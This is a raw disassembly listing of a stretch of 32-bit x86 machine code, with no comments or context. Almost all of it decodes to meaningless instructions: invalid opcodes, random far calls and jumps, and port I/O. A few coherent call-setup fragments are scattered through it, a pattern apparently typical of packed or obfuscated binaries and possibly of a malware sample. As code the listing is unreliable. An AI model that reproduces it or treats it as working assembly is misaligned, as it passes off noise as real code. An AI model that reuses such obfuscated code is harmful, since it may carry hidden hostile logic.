  405b3d:	pop    ecx
  405b3e:	mov    al,ds:0xe0d603eb
  405b43:	enter  0x8cd0,0x1a
  405b47:	inc    ecx
  405b48:	(bad)  
  405b49:	rcr    DWORD PTR [edi+ecx*8+0x2debcd9c],cl
  405b50:	rcl    esp,0x69
  405b53:	pop    esp
  405b54:	pop    ebp
  405b55:	add    DWORD PTR [esi],ebx
  405b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b58:	pop    es
  405b59:	mov    DWORD PTR [edi-0x1],eax
  405b5c:	call   0xe72574f6
  405b61:	leave  
  405b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b63:	push   es
  405b64:	sub    eax,0x299a0f71
  405b69:	push   0xffffffee
  405b6b:	dec    esi
  405b6c:	scas   eax,DWORD PTR es:[edi]
  405b6d:	test   BYTE PTR [ebp+0x73ebe40c],ch
  405b73:	std    
  405b74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b75:	fdiv   QWORD PTR [edi]
  405b77:	mov    ebp,0x938b49ec
  405b7c:	mov    ah,0x21
  405b7e:	stc    
  405b7f:	sar    DWORD PTR [ebp+0x59],1
  405b82:	outs   dx,DWORD PTR gs:[esi]
  405b84:	pop    ebp
  405b85:	push   ebx
  405b86:	ds dec ebx
  405b88:	fimul  WORD PTR [ebx-0x39cc13bb]
  405b8e:	add    eax,edi
  405b90:	push   eax
  405b91:	mov    eax,DWORD PTR [ebp-0x10]
  405b94:	add    eax,0xaa
  405b99:	push   eax
  405b9a:	jmp    0x405d92
  405b9f:	jne    0x405bbe
  405ba1:	adc    eax,0x71b155b1
  405ba6:	fld    DWORD PTR [edi+0x3f]
  405ba9:	mov    dh,0xdb
  405bab:	xor    eax,0x605aedab
  405bb0:	sub    DWORD PTR [esi+0x7e],edi
  405bb3:	push   ebp
  405bb4:	jg     0x405c34
  405bb6:	jle    0x405b7b
  405bb8:	fcom   DWORD PTR [ebp+0x62]
  405bbb:	popf   
  405bbc:	ins    BYTE PTR es:[edi],dx
  405bbd:	je     0x405b9a
  405bbf:	pop    ecx
  405bc0:	add    BYTE PTR [ebp*4+0x66f1e781],cl
  405bc7:	mov    BYTE PTR [ebx-0x72],dh
  405bca:	adc    eax,0xc45e5589
  405bcf:	(bad)  
  405bd0:	jne    0x405bea
  405bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bd3:	push   cs
  405bd4:	xor    BYTE PTR [eax],bh
  405bd6:	shl    ecx,1
  405bd8:	lods   eax,DWORD PTR ds:[esi]
  405bd9:	pop    edi
  405bda:	outs   dx,BYTE PTR ds:[esi]
  405bdb:	je     0x405c55
  405bdd:	scas   eax,DWORD PTR es:[edi]
  405bde:	lods   eax,DWORD PTR ds:[esi]
  405bdf:	test   ecx,edx
  405be1:	xor    eax,DWORD PTR [esi+0x59]
  405be4:	es clc 
  405be6:	or     edi,DWORD PTR [ebx+0x4496cd4]
  405bec:	or     ecx,DWORD PTR [eax]
  405bee:	popa   
  405bef:	sbb    eax,0xca41efdd
  405bf4:	pop    ebp
  405bf5:	out    dx,al
  405bf6:	pushf  
  405bf7:	inc    ebx
  405bf8:	outs   dx,DWORD PTR ds:[esi]
  405bf9:	ins    DWORD PTR es:[edi],dx
  405bfa:	xor    DWORD PTR [edi-0x15],esp
  405bfd:	rcl    dh,cl
  405bff:	push   0x50
  405c01:	adc    DWORD PTR [edx],edi
  405c03:	xor    al,0xd7
  405c05:	xchg   edx,eax
  405c06:	jnp    0x405c1a
  405c08:	int3   
  405c09:	lock addr16 out 0xa2,al
  405c0d:	xchg   ecx,eax
  405c0e:	mul    BYTE PTR [edx]
  405c10:	mov    ecx,0x6153be22
  405c15:	mov    ds:0xdf16c66e,eax
  405c1a:	sub    ah,bh
  405c1c:	data16 loopne 0x405c67
  405c1f:	scas   al,BYTE PTR es:[edi]
  405c20:	ds pop ebp
  405c22:	dec    esp
  405c23:	and    dx,WORD PTR [ebx+0x76]
  405c27:	mov    ds:0xbae49a7d,al
  405c2c:	mov    WORD PTR [ecx+0x29e4c945],ss
  405c32:	xchg   ecx,eax
  405c33:	stos   BYTE PTR es:[edi],al
  405c34:	or     BYTE PTR [edx],al
  405c36:	popa   
  405c37:	fwait
  405c38:	pop    esi
  405c39:	test   al,0x70
  405c3b:	ret    
  405c3c:	inc    edi
  405c3d:	dec    edi
  405c3e:	mov    ah,0x7a
  405c40:	int    0xd
  405c42:	in     al,dx
  405c43:	out    0xd0,eax
  405c45:	xchg   BYTE PTR [ebp-0x34],al
  405c48:	xchg   edx,eax
  405c49:	jae    0x405c2f
  405c4b:	mov    BYTE PTR [ebx-0x16b2cec0],bh
  405c51:	jl     0x405c47
  405c53:	daa    
  405c54:	push   esi
  405c55:	pushf  
  405c56:	sub    al,0xfe
  405c58:	into   
  405c59:	daa    
  405c5a:	pushf  
  405c5b:	shl    DWORD PTR [edi+0xd],cl
  405c5e:	jecxz  0x405c38
  405c60:	mov    ah,0x3d
  405c62:	repnz sbb eax,edi
  405c65:	sbb    eax,0xebffbe1c
  405c6a:	pop    edi
  405c6b:	outs   dx,BYTE PTR ds:[esi]
  405c6c:	ret    0x6856
  405c6f:	dec    esp
  405c70:	rcl    DWORD PTR [ecx-0x137791c3],cl
  405c76:	add    eax,0xf535849f
  405c7b:	inc    edi
  405c7c:	daa    
  405c7d:	pop    ebx
  405c7e:	pop    es
  405c7f:	call   0x510b:0xbfa6a377
  405c86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c87:	out    dx,al
  405c88:	imul   eax,DWORD PTR [ebx],0xffffff84
  405c8b:	jl     0x405cf7
  405c8d:	gs adc bl,ch
  405c90:	fwait
  405c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c92:	jo     0x405d01
  405c94:	mov    dl,0x93
  405c96:	cmp    eax,0xa5bd46cc
  405c9b:	mov    eax,0x8b00726a
  405ca0:	xchg   edx,eax
  405ca1:	jmp    0x89d8fd1a
  405ca6:	mov    DWORD PTR [ecx+0x5e6582e],esi
  405cac:	data16 (bad) 
  405cae:	aad    0x1e
  405cb0:	xor    al,0xcd
  405cb2:	xor    esp,DWORD PTR [ecx-0x3213121f]
  405cb8:	dec    ebx
  405cb9:	dec    ebp
  405cba:	shr    DWORD PTR [edx+0xf],cl
  405cbd:	ins    BYTE PTR es:[edi],dx
  405cbe:	mov    ch,0x64
  405cc0:	dec    ecx
  405cc1:	dec    ebp
  405cc2:	(bad)  
  405cc3:	iret   
  405cc4:	sub    eax,DWORD PTR [eax+0x2d0e203b]
  405cca:	cld    
  405ccb:	mov    ds:0xa021d686,eax
  405cd0:	fwait
  405cd1:	das    
  405cd2:	shr    DWORD PTR [edx],0x37
  405cd5:	adc    esi,ecx
  405cd7:	sub    cl,al
  405cd9:	sbb    DWORD PTR ds:0x12b04356,edx
  405cdf:	in     eax,dx
  405ce0:	jl     0x405c9a
  405ce2:	dec    edi
  405ce3:	push   0x18e4955f
  405ce8:	lods   al,BYTE PTR ds:[esi]
  405ce9:	sti    
  405cea:	sti    
  405ceb:	mov    edx,0x54eb766
  405cf0:	cmc    
  405cf1:	aaa    
  405cf2:	leave  
  405cf3:	(bad)
  405cf7:	jl     0x405cf0
  405cf9:	add    DWORD PTR [ebx],0xa10679c6
  405cff:	in     al,dx
  405d00:	push   ds
  405d01:	mov    ch,0x69
  405d03:	lods   eax,DWORD PTR ds:[esi]
  405d04:	inc    edx
  405d05:	lods   eax,DWORD PTR ds:[esi]
  405d06:	mov    bh,0xdf
  405d08:	cmp    eax,0x5b21c3cc
  405d0d:	aas    
  405d0e:	bound  esi,QWORD PTR [esi+0x1e943eb7]
  405d14:	fs std 
  405d16:	imul   esp,DWORD PTR [ebx-0x7e1d9e69],0x8
  405d1d:	mov    ebp,0x75e0048a
  405d22:	xchg   ebp,eax
  405d23:	loope  0x405d82
  405d25:	mov    eax,0x50f28838
  405d2a:	arpl   bp,sp
  405d2c:	add    ebp,edi
  405d2e:	xlat   BYTE PTR ds:[ebx]
  405d2f:	cmp    edx,eax
  405d31:	or     eax,0xb48701b1
  405d36:	pop    ss
  405d37:	fcmovu st,st(7)
  405d39:	pop    ss
  405d3a:	cmp    eax,0xfc8d596
  405d3f:	sar    BYTE PTR [edx-0x468b082a],1
  405d45:	pop    ebx
  405d46:	xor    al,0xda
  405d48:	lahf   
  405d49:	mov    esp,DWORD PTR [edi]
  405d4b:	out    0xfe,eax
  405d4d:	or     esi,DWORD PTR [esi]
  405d4f:	jp     0x405d8e
  405d51:	dec    esi
  405d52:	sbb    eax,0x8a866b8a
  405d57:	xchg   ebx,eax
  405d58:	or     eax,0x8821c8bc
  405d5d:	aas    
  405d5e:	or     eax,0x87709be0
  405d63:	xchg   edi,eax
  405d64:	scas   eax,DWORD PTR es:[edi]
  405d65:	mov    WORD PTR [eax+0x3f4a75ee],fs
  405d6b:	mov    ds:0x8450cc30,al
  405d70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d71:	js     0x405d74
  405d73:	mov    bl,0x3
  405d75:	or     ebx,edx
  405d77:	xor    eax,0x84a525c7
  405d7c:	or     dl,BYTE PTR [ecx]
  405d7e:	mov    dh,ah
  405d80:	js     0x405d72
  405d82:	and    eax,0x3f7d8041
  405d87:	into   
  405d88:	pop    eax
  405d89:	pusha  
  405d8a:	ret    
  405d8b:	sti    
  405d8c:	imul   ecx,DWORD PTR [edx],0x35
  405d8f:	fcom   QWORD PTR [ebp-0xfba74ed]
  405d95:	mov    eax,DWORD PTR [eax+0x198]
  405d9b:	push   DWORD PTR [eax]
  405d9d:	call   0x40cdc5
  405da2:	mov    DWORD PTR [ebp-0x8],eax
  405da5:	cmp    DWORD PTR [ebp-0x8],0x0
  405da9:	lea    eax,[ebp+0x4]
  405dac:	jmp    0x405fa4
  405db1:	xchg   ebx,eax
  405db2:	leave  
  405db3:	ror    DWORD PTR [esi-0x2eae69af],1
  405db9:	mov    ds:0xb9c135b,al
  405dbe:	std    
  405dbf:	push   ss
  405dc0:	sbb    al,0x47
  405dc2:	aaa    
  405dc3:	jle    0x405e43
  405dc5:	push   ebp
  405dc6:	jg     0x405e46
  405dc8:	jle    0x405d9c
  405dca:	stos   BYTE PTR es:[edi],al
  405dcb:	xchg   edx,eax
  405dcc:	loope  0x405e22
  405dce:	jmp    0x6344b25a
  405dd3:	test   eax,0x2dfc4c39
  405dd8:	lock push ss
  405dda:	shl    BYTE PTR [edi+0x0],0xeb
  405dde:	loope  0x405d71
  405de0:	lods   eax,DWORD PTR ds:[esi]
  405de1:	jns    0x405d65
  405de3:	(bad)  
  405de4:	into   
  405de5:	(bad)  
  405de6:	sbb    BYTE PTR [eax-0x21],ch
  405de9:	xor    bh,BYTE PTR [ecx+0x22e7625d]
  405def:	or     cl,al
  405df1:	dec    esi
  405df2:	test   BYTE PTR [esi-0x33aaac70],dh
  405df8:	mov    edi,0x7d55bd84
  405dfd:	stos   DWORD PTR es:[edi],eax
  405dfe:	sbb    edx,DWORD PTR [ecx+0x35]
  405e01:	call   0x74f3366e
  405e06:	sbb    ecx,DWORD PTR [esp+edx*8]
  405e09:	mov    DWORD PTR [edx+0x6b],ecx
  405e0c:	pop    edx
  405e0d:	xlat   BYTE PTR ds:[ebx]
  405e0e:	and    al,0x48
  405e10:	repz mov al,ds:0x39f7b9d6
  405e16:	pop    ds
  405e17:	mov    ah,0x31
  405e19:	mov    BYTE PTR [ebx+0x35a4c917],bl
  405e1f:	stos   BYTE PTR es:[edi],al
  405e20:	aad    0xe1
  405e22:	bound  eax,QWORD PTR [ebx-0x36]
  405e25:	push   es
  405e26:	ds enter 0xc07d,0xff
  405e2b:	mov    dh,0x32
  405e2d:	mov    al,0x1b
  405e2f:	push   ebp
  405e30:	out    dx,eax
  405e31:	pop    edi
  405e32:	dec    edi
  405e33:	and    ebp,0xf1f4f33e
  405e39:	icebp  
  405e3a:	addr16 push cs
  405e3c:	dec    edi
  405e3d:	jno    0x405e0d
  405e3f:	(bad)  
  405e40:	stos   DWORD PTR es:[edi],eax
  405e41:	dec    edx
  405e42:	enter  0xd58b,0xbe
  405e46:	fwait
  405e47:	mov    al,0x5d
  405e49:	push   0x710f8ed8
  405e4e:	(bad)  
  405e4f:	gs out dx,al
  405e51:	dec    esi
  405e52:	mov    esp,0x46332eeb
  405e57:	adc    edi,DWORD PTR [edx-0x6f]
  405e5a:	retf   0x55af
  405e5d:	cmp    esi,DWORD PTR [edx+0x7c76c9e7]
  405e63:	cwde   
  405e64:	mov    cl,0xc
  405e66:	cmc    
  405e67:	lahf   
  405e68:	enter  0x95c2,0xf5
  405e6c:	mov    edi,0x59c7c157
  405e71:	mov    al,ds:0xbc0993d3
  405e76:	lea    ebp,[eax+0x4f29223f]
  405e7c:	iret   
  405e7d:	push   esi
  405e7e:	daa    
  405e7f:	mov    ah,0xd9
  405e81:	dec    edi
  405e82:	mov    BYTE PTR [ebp-0x474a16b1],ah
  405e88:	pop    ecx
  405e89:	ss and al,0xb0
  405e8c:	popf   
  405e8d:	es jp  0x405eea
  405e90:	pop    ebp
  405e91:	mov    ds:0x1eeec4b3,eax
  405e96:	add    eax,0xe30debf4
  405e9b:	or     eax,eax
  405e9d:	(bad)  
  405e9e:	cs pop es
  405ea0:	mov    al,0x81
  405ea2:	push   edx
  405ea3:	(bad)  
  405ea4:	sub    eax,0x882d8277
  405ea9:	mov    dh,0x34
  405eab:	int    0x9d
  405ead:	gs clc 
  405eaf:	pop    edi
  405eb0:	repz sbb edi,ebx
  405eb3:	repnz fucomip st,st(1)
  405eb6:	or     ebp,edx
  405eb8:	xor    al,0x78
  405eba:	adc    DWORD PTR [ecx],ecx
  405ebc:	mov    ebx,0x609d7181
  405ec1:	scas   eax,DWORD PTR es:[edi]
  405ec2:	sar    DWORD PTR [ebp+0x1d],0x60
  405ec6:	jmp    0x405ef2
  405ec8:	jl     0x405f0d
  405eca:	fiadd  WORD PTR [esi-0x4a]
  405ecd:	lea    ecx,[ecx-0x21]
  405ed0:	jmp    0x4855c473
  405ed5:	lahf   
  405ed6:	sbb    ch,BYTE PTR [edx-0x6eda9001]
  405edc:	loope  0x405e5f
  405ede:	and    al,0x40
  405ee0:	inc    ebx
  405ee1:	loope  0x405ed3
  405ee3:	(bad)  
  405ee4:	jmp    0xd4fa:0x1cbb6293
  405eeb:	mov    ebx,0x45c1f6c
  405ef0:	aaa    
  405ef1:	ja     0x405f00
  405ef3:	or     BYTE PTR [eax+eax*4+0x27451f29],bl
  405efa:	add    ebx,DWORD PTR [ecx-0x35]
  405efd:	sbb    DWORD PTR [ecx+0x212b7a30],esi
  405f03:	pusha  
  405f04:	repz xchg ecx,eax
  405f06:	imul   BYTE PTR [ebp-0x4d9b5dd7]
  405f0c:	sub    ebx,edi
  405f0e:	mov    esi,0x1903090b
  405f13:	and    eax,0x2b79526a
  405f18:	mov    al,ds:0xcdfd1eb5
  405f1d:	mov    ch,0x10
  405f1f:	push   ebx
  405f20:	mov    esi,DWORD PTR [edx]
  405f22:	jnp    0x405eca
  405f24:	or     DWORD PTR [ebp-0xa],esp
  405f27:	or     BYTE PTR [edi+0x22],dh
  405f2a:	outs   dx,BYTE PTR ds:[esi]
  405f2b:	jle    0x405ecf
  405f2d:	stc    
  405f2e:	mov    edx,esi
  405f30:	and    ch,ah
  405f32:	lods   eax,DWORD PTR ds:[esi]
  405f33:	or     BYTE PTR [edi+0x502240cc],ch
  405f39:	ror    BYTE PTR [esi+0x6241422d],cl
  405f3f:	pop    esi
  405f40:	scas   eax,DWORD PTR es:[edi]
  405f41:	js     0x405ecd
  405f43:	jle    0x405f6f
  405f45:	push   ss
  405f46:	aam    0x22
  405f48:	mov    al,ds:0x5ca4d758
  405f4d:	iret   
  405f4e:	inc    ecx
  405f4f:	inc    DWORD PTR [edx-0x187c9233]
  405f55:	xchg   ebx,eax
  405f56:	out    dx,eax
  405f57:	rol    BYTE PTR [ebp+0x6d4154ae],cl
  405f5d:	shl    DWORD PTR [edx+0x24],1
  405f60:	ja     0x405f1d
  405f62:	ss int 0x99
  405f65:	fwait
  405f66:	arpl   WORD PTR [esi-0x6e],si
  405f69:	adc    esi,esp
  405f6b:	stc    
  405f6c:	mov    edx,0xcd0101ec
  405f71:	inc    eax
  405f72:	sahf   
  405f73:	pop    ecx
  405f74:	push   edx
  405f75:	add    BYTE PTR ds:[edi-0x42],cl
  405f79:	cmp    al,0x3c
  405f7b:	or     DWORD PTR [esi],esp
  405f7d:	mov    ecx,0x384d5bda
  405f82:	push   edx
  405f83:	jae    0x405f57
  405f85:	xchg   esi,eax
  405f86:	lahf   
  405f87:	or     BYTE PTR [edx-0x19a9f212],0x36
  405f8e:	adc    bl,BYTE PTR [ebp+0x5bdad481]
  405f94:	daa    
  405f95:	les    ebx,FWORD PTR [edi-0x26005df2]
  405f9b:	bound  eax,QWORD PTR [ecx+0x1444b1c]
  405fa1:	into   
  405fa2:	shl    DWORD PTR [ecx+ecx*4+0x45],cl
  405fa6:	loopne 0x405fb7
  405fa8:	test   BYTE PTR [esi-0x16fffff6],dl
  405fae:	repz add DWORD PTR [eax],eax
  405fb1:	add    bl,ch
  405fb3:	hlt    
  405fb4:	pushf  
  405fb5:	dec    esi
  405fb6:	mov    eax,ds:0x9371e956
  405fbb:	inc    ebx
  405fbc:	and    dl,BYTE PTR [ecx-0x3e]
  405fbf:	sti    
  405fc0:	add    DWORD PTR [edi],esi
  405fc2:	call   0x7e7f:0x557e7e35
  405fc9:	jle    0x405f63
  405fcb:	adc    al,0x98
  405fcd:	std    
  405fce:	and    cl,ch
  405fd0:	or     dh,cl
  405fd2:	jnp    0x405f65
  405fd4:	ficomp WORD PTR [ebp-0x661c603b]
  405fda:	cmp    al,0xe1
  405fdc:	jne    0x405f64
  405fde:	sti    
  405fdf:	pop    ds
  405fe0:	ins    BYTE PTR es:[edi],dx
  405fe1:	xor    ch,ch
  405fe3:	add    DWORD PTR [edi-0x6baabd04],0x24
  405fea:	and    ecx,DWORD PTR [esi+0x1]
  405fed:	test   al,0xc2
  405fef:	push   0xb882b5
  405ff4:	or     dl,bl
  405ff6:	stc    
  405ff7:	fcomip st,st(6)
  405ff9:	arpl   WORD PTR [ecx+0x64],cx
  405ffc:	mov    ch,0xea
  405ffe:	cmp    edx,DWORD PTR [edi-0x5c250862]
  406004:	outs   dx,DWORD PTR ds:[esi]
  406005:	dec    edi
  406006:	stos   BYTE PTR es:[edi],al
  406007:	stos   BYTE PTR es:[edi],al
  406008:	loopne 0x40607e
  40600a:	dec    edi
  40600b:	mov    ecx,0x953a6f07
  406010:	out    0x53,eax
  406012:	test   eax,0x99ca7687
  406017:	xor    ebx,DWORD PTR [edx+0x1]
  40601a:	mov    eax,0xa7aafd3a
  40601f:	add    al,0x98
  406021:	in     eax,dx
  406022:	dec    esp
  406023:	sub    al,0x3b
  406025:	add    esi,esi
  406027:	test   eax,0x88f1d68e
  40602c:	mov    ds:0x8effb6cb,al
  406031:	dec    esi
  406032:	fst    st(7)
  406034:	leave  
  406035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406036:	mov    edx,0xb56d0559
  40603b:	aam    0x5d
  40603d:	call   0xb633:0x879c6a81
  406044:	in     al,dx
  406045:	push   es
  406046:	sbb    esi,DWORD PTR [edx-0x3dede5d1]
  40604c:	mov    al,ds:0xda024a4f
  406051:	imul   ecx,DWORD PTR [edi-0x6e5953d],0xc2789119
  40605b:	rol    edi,cl
  40605d:	call   0x5679:0x25611fe3
  406064:	scas   al,BYTE PTR es:[edi]
  406065:	push   ss
  406066:	popa   
  406067:	rol    BYTE PTR [ebx+0xaf4f99e],0xf5
  40606e:	dec    edi
  40606f:	retf   0x3b7a
  406072:	out    0xe6,al
  406074:	jl     0x40608e
  406076:	and    edi,DWORD PTR [edx+esi*2-0x45eac8a3]
  40607d:	hlt    
  40607e:	jmp    0x406061
  406080:	xchg   edi,eax
  406081:	mov    cl,0x33
  406083:	fisttp WORD PTR [esi+0x54]
  406086:	add    DWORD PTR [eax+0x2e834276],esp
  40608c:	mov    ebx,0xcac0f30a
  406091:	jle    0x4060ea
  406093:	pop    ebx
  406094:	popa   
  406095:	mov    ch,0x46
  406097:	gs call 0x891d:0x4bb43b50
  40609f:	leave  
  4060a0:	or     ebx,DWORD PTR ds:0xd321cbf6
  4060a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060a7:	retf   
  4060a8:	jnp    0x406100
  4060aa:	xor    BYTE PTR [esi-0x2f7ed44],dh
  4060b0:	dec    edx
  4060b1:	push   0x75cdf4ac
  4060b6:	(bad)  
  4060b7:	mov    ds:0x5857679e,al
  4060bc:	sub    ebx,DWORD PTR [esi+0x1f77180c]
  4060c2:	es pushf 
  4060c4:	es into 
  4060c6:	inc    esi
  4060c7:	xchg   esp,eax
  4060c8:	push   edi
  4060c9:	jne    0x406104
  4060cb:	ror    bl,cl
  4060cd:	jp     0x4060c2
  4060cf:	dec    ebx
  4060d0:	add    ebp,DWORD PTR [eax+0x2f]
  4060d3:	jecxz  0x4060bd
  4060d5:	dec    ecx
  4060d6:	cmp    edi,edi
  4060d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060d9:	pushf  
  4060da:	jl     0x406116
  4060dc:	and    cl,BYTE PTR [eax+0x3e]
  4060df:	sub    ecx,DWORD PTR [edi+0x2d]
  4060e2:	inc    esi
  4060e3:	jnp    0x406070
  4060e5:	jle    0x4060bd
  4060e7:	stos   BYTE PTR es:[edi],al
  4060e8:	jmp    0xcade096c
  4060ed:	nop
  4060ee:	fwait
  4060ef:	hlt    
  4060f0:	push   esp
  4060f1:	mov    bh,0xa0
  4060f3:	ss ret 
  4060f5:	push   0xf35f6eab
  4060fa:	inc    ebp
  4060fb:	inc    ecx
  4060fc:	loop   0x40612d
  4060fe:	lock and BYTE PTR [esi],ch
  406101:	test   DWORD PTR [edx+ebp*8-0x11],ecx
  406105:	ficomp WORD PTR [edi-0x5]
  406108:	fld    DWORD PTR [ecx]
  40610a:	add    ecx,DWORD PTR [edi+0x778e5297]
  406110:	sub    bl,ah
  406112:	sub    eax,0x8b6a4665
  406117:	push   ecx
  406118:	enter  0xb6ca,0x6a
  40611c:	nop
  40611d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40611e:	dec    eax
  40611f:	popa   
  406120:	and    DWORD PTR [ecx-0x768d2a81],edi
  406126:	cwde   
  406127:	push   ebx
  406128:	jne    0x406135
  40612a:	and    eax,0x964671d7
  40612f:	hlt    
  406130:	push   ecx
  406131:	inc    edi
  406132:	mov    ah,0x63
  406134:	xchg   ebx,eax
  406135:	jl     0x406156
  406137:	xchg   ecx,eax
  406138:	push   edi
  406139:	inc    esi
  40613a:	mov    dh,0xba
  40613c:	out    0x5e,eax
  40613e:	mov    edi,0x5198b610
  406143:	bound  ebx,QWORD PTR [ebx+0x69a18f5e]
  406149:	ret    
  40614a:	or     DWORD PTR [edi+ecx*2-0x1d],ebx
  40614e:	pusha  
  40614f:	jno    0x406177
  406151:	es pop ecx
  406153:	pusha  
  406154:	cli    
  406155:	cmp    DWORD PTR [edx+0x1f],esp
  406158:	inc    ebx
  406159:	data16 xor al,BYTE PTR [ebx+0x19da44bf]
  406160:	cdq    
  406161:	xchg   ebx,eax
  406162:	ds push ds
  406164:	fs jmp 0x40618c
  406167:	sbb    ebp,esp
  406169:	ins    DWORD PTR es:[edi],dx
  40616a:	sub    esp,esi
  40616c:	pop    esi
  40616d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40616e:	pop    es
  40616f:	fst    DWORD PTR [ebp+0x545f6f32]
  406175:	jno    0x4061b7
  406177:	cmp    DWORD PTR [esi-0xd4ef9b2],0x58
  40617e:	cmc    
  40617f:	sub    al,0xe2
  406181:	lds    ebp,FWORD PTR [edx]
  406183:	pop    ds
  406184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406185:	fst    DWORD PTR [eax-0xd88edbc]
  40618b:	(bad)  
  40618c:	stos   BYTE PTR es:[edi],al
  40618d:	stc    
  40618e:	adc    ch,BYTE PTR [edx-0x3]
  406191:	(bad)  
  406192:	fimul  WORD PTR [esi]
  406194:	inc    edx
  406195:	or     bl,BYTE PTR [edx+0x6ad15d97]
  40619b:	cmp    esp,DWORD PTR [eax+0x455f3a34]
  4061a1:	and    BYTE PTR [esi],al
  4061a3:	cmp    dh,al
  4061a5:	lea    eax,[ebp-0x18]
  4061a8:	push   eax
  4061a9:	mov    eax,DWORD PTR [ebp-0x2c]
  4061ac:	xor    eax,esi
  4061ae:	add    eax,edi
  4061b0:	push   eax
  4061b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4061b4:	xor    eax,esi
  4061b6:	add    eax,edi
  4061b8:	push   eax
  4061b9:	push   DWORD PTR [ebp-0x8]
  4061bc:	lea    eax,[ebp-0x78]
  4061bf:	push   eax
  4061c0:	jmp    0x4063b8
  4061c5:	cmp    eax,0xb41aac57
  4061ca:	loope  0x406215
  4061cc:	jno    0x406181
  4061ce:	dec    edi
  4061cf:	add    dl,cl
  4061d1:	or     ah,BYTE PTR [edi+0x33f1d3f1]
  4061d7:	jle    0x406257
  4061d9:	push   ebp
  4061da:	jg     0x40625a
  4061dc:	jle    0x406233
  4061de:	adc    ebx,ebp
  4061e0:	inc    ecx
  4061e1:	stc    
  4061e2:	popa   
  4061e3:	fxam   
  4061e5:	adc    ecx,ebp
  4061e7:	and    dh,dh
  4061e9:	and    ebx,eax
  4061eb:	int3   
  4061ec:	sbb    al,0x27
  4061ee:	push   cs
  4061ef:	lds    edi,FWORD PTR [edi]
  4061f1:	jnp    0x40624b
  4061f3:	ficom  DWORD PTR [edx-0x68]
  4061f6:	mov    eax,0x25cb78be
  4061fb:	test   DWORD PTR [ecx-0x6527144b],0xdd603bfd
  406205:	inc    esi
  406206:	sahf   
  406207:	hlt    
  406208:	cld    
  406209:	sbb    BYTE PTR [esi+0x1c731e47],dl
  40620f:	jbe    0x40619b
  406211:	push   ss
  406212:	(bad)  
  406213:	adc    ebp,ecx
  406215:	dec    edx
  406216:	aad    0x0
  406218:	push   ds
  406219:	mov    ecx,0x5ca6acec
  40621e:	mov    cl,0x4a
  406220:	sbb    ebp,eax
  406222:	iret   
  406223:	jae    0x4061bc
  406225:	aas    
  406226:	xchg   DWORD PTR [ebx-0x5e7b1891],ebx
  40622c:	rcl    BYTE PTR [ebx-0x4ed8a39a],1
  406232:	sub    DWORD PTR [ecx+0x4572302c],esi
  406238:	stos   BYTE PTR es:[edi],al
  406239:	xchg   DWORD PTR [edx+0x3a],ecx
  40623c:	fisubr WORD PTR [edi]
  40623e:	rcl    DWORD PTR [ebx],cl
  406240:	call   0x99bf:0xe6326d2a
  406247:	mov    cl,0x9d
  406249:	sbb    eax,0xfe3f83e1
  40624e:	scas   al,BYTE PTR es:[edi]
  40624f:	loopne 0x40625f
  406251:	pop    esp
  406252:	out    0xcb,al
  406254:	gs xchg ebp,eax
  406256:	inc    esi
  406257:	inc    ecx
  406258:	sub    DWORD PTR [edi-0x61b37b6d],ebp
  40625e:	mov    ecx,0x696bc81e
  406263:	add    ah,BYTE PTR [esi]
  406265:	loopne 0x4062a5
  406267:	outs   dx,DWORD PTR ds:[esi]
  406268:	cmp    BYTE PTR [ebx+0x23c208dc],cl
  40626e:	pusha  
  40626f:	adc    ch,al
  406271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406272:	pop    eax
  406273:	hlt    
  406274:	stc    
  406275:	jno    0x4062c2
  406277:	pop    ebx
  406278:	pop    esi
  406279:	dec    esi
  40627a:	lods   eax,DWORD PTR ds:[esi]
  40627b:	cmp    dh,BYTE PTR [edx]
  40627d:	repnz add edx,DWORD PTR [esi+0x6e5d8db5]
  406284:	ds sti 
  406286:	adc    BYTE PTR [eax-0x2362f02f],ah
  40628c:	enter  0xd5e0,0x55
  406290:	dec    ecx
  406291:	(bad)  
  406293:	int    0x7a
  406295:	inc    esi
  406296:	aas    
  406297:	sub    eax,0x1bc02d12
  40629c:	sar    DWORD PTR [ebx],0xaf
  40629f:	popf   
  4062a0:	ret    0x302a
  4062a3:	scas   al,BYTE PTR es:[edi]
  4062a4:	pop    edi
  4062a5:	cli    
  4062a6:	test   BYTE PTR [esi-0x67],bl
  4062a9:	and    al,0x79
  4062ab:	fld    QWORD PTR [edi+0x4a]
  4062ae:	neg    BYTE PTR es:[ebx+0x6d1efcab]
  4062b5:	add    ebx,DWORD PTR gs:[edi+0x6d]
  4062b9:	and    DWORD PTR [ebx+0x43],esp
  4062bc:	fbld   TBYTE PTR [edx]
  4062be:	xor    cl,BYTE PTR [edi]
  4062c0:	cmp    ch,BYTE PTR [ecx+edx*2+0x4579d9fb]
  4062c7:	pusha  
  4062c8:	adc    DWORD PTR [esp+esi*2-0x55],ebx
  4062cc:	fist   WORD PTR [ebp+0xf6a5358]
  4062d2:	ffree  st(2)
  4062d4:	push   ecx
  4062d5:	xor    edx,edi
  4062d7:	or     al,BYTE PTR [ebx+0x30432d2d]
  4062dd:	push   es
  4062de:	adc    al,0x7f
  4062e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062e1:	jb     0x406305
  4062e3:	leave  
  4062e4:	sub    edx,DWORD PTR [ebx]
  4062e6:	shr    BYTE PTR [edx],cl
  4062e8:	push   0x2db60e09
  4062ed:	std    
  4062ee:	(bad)
  4062f2:	ja     0x406304
  4062f4:	ror    BYTE PTR [ecx+0x19901ec2],0xd6
  4062fb:	and    eax,0x6d440816
  406300:	mov    ch,0x98
  406302:	lods   eax,DWORD PTR ds:[esi]
  406303:	push   edi
  406304:	lahf   
